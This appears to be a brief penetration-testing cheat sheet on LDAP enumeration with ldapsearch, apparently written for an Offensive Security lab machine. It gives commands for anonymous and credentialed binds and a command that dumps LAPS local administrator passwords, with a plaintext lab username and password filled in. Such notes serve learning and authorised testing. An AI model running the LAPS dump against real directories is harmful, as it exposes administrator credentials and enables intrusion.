# LDAP protocol  

Anonymous bind with ldapsearch.  

`ldapsearch -x -H ldap://IP -b "dc=example,dc=com"`  

Bind with credentials.  

`ldapsearch -x -H ldap://IP -D "domain\username" -w "password" -b "dc=example,dc=com"`  

Dumping LAPS password.  

`ldapsearch -x -H ldap://192.168.64.122 -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd`
